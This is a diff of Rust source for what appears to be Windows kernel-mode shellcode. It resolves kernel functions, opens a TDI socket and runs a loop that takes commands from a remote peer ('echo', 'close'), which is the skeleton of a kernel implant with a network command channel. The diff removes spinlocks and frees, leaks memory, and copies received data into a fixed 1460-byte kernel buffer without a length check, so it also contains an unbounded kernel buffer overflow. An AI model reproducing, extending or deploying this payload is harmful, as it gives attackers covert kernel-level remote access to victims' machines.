@@ -57,10 +57,11 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
     (*tdi_ctx).funcs.zw_create_file =                       ntproc::find!("ZwCreateFile");
     (*tdi_ctx).funcs.mm_probe_and_lock_pages =              ntproc::find!("MmProbeAndLockPages");
     (*tdi_ctx).funcs.ke_raise_irql_to_dpc_level =           ntproc::find!("KeRaiseIrqlToDpcLevel");
-    (*tdi_ctx).funcs.ke_lower_irql =                        ntproc::find!("KeLowerIrql");
+    //(*tdi_ctx).funcs.ke_lower_irql =                        ntproc::find!("KeLowerIrql");
 
-    (*tdi_ctx).sync = 0u32;
+    // (*tdi_ctx).sync = 0u32;
     (*tdi_ctx).msg_available = 0u32;
+    (*tdi_ctx).app_buffer = ((*tdi_ctx).funcs.ex_allocate_pool)(ntdef::enums::POOL_TYPE::NonPagedPool, 1460 as _);
 
     use nttdi::Socket;
     let mut socket = nttdi::TdiSocket::new(tdi_ctx);
@@ -71,8 +72,12 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
     let hello = [0x68u8, 0x65u8, 0x6cu8, 0x6cu8, 0x6fu8, 0x0au8];
 	let _ = socket.send(&hello as *const u8, 6 as _);
 
-    let mut kirql: ntdef::types::KIRQL;
-    let mut buf: ntdef::types::PVOID = ntdef::enums::NULL;
+    // let mut kirql: ntdef::types::KIRQL;
+    // let mut buf: ntdef::types::PVOID = ntdef::enums::NULL;
+    let buf: ntdef::types::PVOID = ((*tdi_ctx).funcs.ex_allocate_pool)(
+        ntdef::enums::POOL_TYPE::NonPagedPool, 1460 as _
+    );
+    
     let mut buf_len: u32 = 0;
     let mut exec: u32 = 0 as _;
 
@@ -81,24 +86,25 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
         while (*tdi_ctx).msg_available == 0u32 {
             asm!("nop");
         }
+        // spinlock not necessary because recv_handler is atomic w.r.t. this main (DPC vs PASSIVE)
+        /*
         kirql = ((*tdi_ctx).funcs.ke_raise_irql_to_dpc_level)();
         acquire_spinlock(&mut (*tdi_ctx).sync);
+        */
         if (*tdi_ctx).msg_available == 1u32 {
-            buf = ((*tdi_ctx).funcs.ex_allocate_pool)(
-                ntdef::enums::POOL_TYPE::NonPagedPool, (*tdi_ctx).buf_len as _);
             buf_len = (*tdi_ctx).buf_len as _;
             ntdef::macros::RtlCopyMemory(buf as _, (*tdi_ctx).app_buffer as _, buf_len as _);
-            ((*tdi_ctx).funcs.ex_free_pool_with_tag)((*tdi_ctx).app_buffer, 0);
             exec = 1 as _;
             (*tdi_ctx).msg_available = 0u32;
         }
+        /*
         (*tdi_ctx).sync = 0u32;
         ((*tdi_ctx).funcs.ke_lower_irql)(kirql);
+        */
         if exec == 1u32 {
             let echo_cmd = [0x65u8, 0x63u8, 0x68u8, 0x6fu8, 0x20u8];
             let close_cmd = [0x63u8, 0x6cu8, 0x6fu8, 0x73u8, 0x65u8, 0x0au8];
             if ntdef::macros::RtlEqualMemory(buf as _, &echo_cmd as _, 5) == 1u32 {
-                // let _ = socket.send(buf.offset(5) as *const u8, buf_len - 5);
                 let _ = socket.send((buf as *const u8).offset(5) as *const u8, buf_len - 5);
             } else if ntdef::macros::RtlEqualMemory(buf as _, &close_cmd as _, 6) == 1u32 {
                 _ = socket.close();
@@ -107,10 +113,15 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
                 let invalid_cmd = [0x69u8, 0x6eu8, 0x76u8, 0x61u8, 0x6cu8, 0x69u8, 0x64u8, 0x20u8, 0x63u8, 0x6fu8, 0x6du8, 0x6du8, 0x61u8, 0x6eu8, 0x64u8, 0x0au8];
                 let _ = socket.send(&invalid_cmd as *const u8, 16 as _);
             }
-            ((*tdi_ctx).funcs.ex_free_pool_with_tag)(buf, 0);
             exec = 0 as _;
         }
     }
+    (*tdi_ctx).msg_available = 1u32;    // to inhibit recv_handler
+    // Doing these de-allocations causes bug check in the cleaning-up module
+    /*
+    ((*tdi_ctx).funcs.ex_free_pool_with_tag)(buf, 1);
+    ((*tdi_ctx).funcs.ex_free_pool_with_tag)((*tdi_ctx).app_buffer as _, 2);
+    */
     // this is to avoid errors if returning to a cleaning-up module
     _ = ((*tdi_ctx).funcs.ke_raise_irql_to_dpc_level)();
     Ok(())
@@ -134,15 +145,13 @@ unsafe fn recv_handler(
 
     let tdi_ctx: *mut nttdi::TdiContext = _tdi_event_context as _;
 
-    acquire_spinlock(&mut (*tdi_ctx).sync);
+    // acquire_spinlock(&mut (*tdi_ctx).sync);
     if (*tdi_ctx).msg_available == 0u32 {
-        let out = ((*tdi_ctx).funcs.ex_allocate_pool)(ntdef::enums::POOL_TYPE::NonPagedPool, _bytes_indicated as _);
-        ntdef::macros::RtlCopyMemory(out as _, _buffer as _, _bytes_indicated as _);
-        (*tdi_ctx).app_buffer = out as _;
+        ntdef::macros::RtlCopyMemory((*tdi_ctx).app_buffer as _, _buffer as _, _bytes_indicated as _);
         (*tdi_ctx).buf_len = _bytes_indicated;
         (*tdi_ctx).msg_available = 1u32;
     }
-    (*tdi_ctx).sync = 0u32;
+    // (*tdi_ctx).sync = 0u32;
 
     ntdef::enums::NTSTATUS::STATUS_SUCCESS as _
 }
